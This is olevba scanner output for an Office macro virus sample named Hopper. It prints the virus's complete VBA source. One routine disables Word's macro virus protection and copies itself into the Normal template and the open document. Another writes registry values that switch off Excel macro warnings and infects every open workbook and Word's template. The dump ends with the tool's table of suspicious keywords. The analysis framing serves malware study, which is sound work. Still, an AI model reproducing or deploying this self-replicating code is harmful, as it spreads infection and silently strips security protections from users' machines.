olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper-892679a337e1c6a4e7dbb2ca948787b611bdf9ac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Hopper-892679a337e1c6a4e7dbb2ca948787b611bdf9ac - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
Private Sub Document_Close()
    On Error Resume Next
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        For i = 1 To 19
            NT.InsertLines i, AD.Lines(i, 1)
        Next
    End If
    If AD.Lines(1, 1) <> "'<!--1nternal-->" Then
        For i = 1 To 19
            AD.InsertLines i, NT.Lines(i, 1)
        Next
    End If
End Sub
'Ex-cell v0.1 /1nternal
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set WSHshell = CreateObject("WScript.Shell")
    WSHshell.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel\Options6", 0, "REG_DWORD"
    WSHshell.Regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel\Options6", 0, "REG_DWORD"
    For i = 1 To Workbooks.Count
        If Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(1, 1) <> "'<!--1nternal-->" Then
            For y = 1 To 45
                Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.InsertLines y, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(y, 1)
            Next
        End If
    Next
    Set WordObj = CreateObject("Word.Application")
    Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
    If NT.Lines(1, 1) <> "'<!--1nternal-->" Then
        WordObj.Options.SaveNormalPrompt = False
        NT.DeleteLines 1, NT.CountOfLines
        For i = 1 To 19
            NT.InsertLines i, ThisWorkbook.VBProject.VBComponents.Item("ThisWorkbook").CodeModule.Lines(i, 1)
        Next
    End If
    Set NT = Nothing
    WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Hopper-892679a337e1c6a4e7dbb2ca948787b611bdf9ac - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Hopper-892679a337e1c6a4e7dbb2ca948787b611bdf9ac - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Hopper-892679a337e1c6a4e7dbb2ca948787b611bdf9ac - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

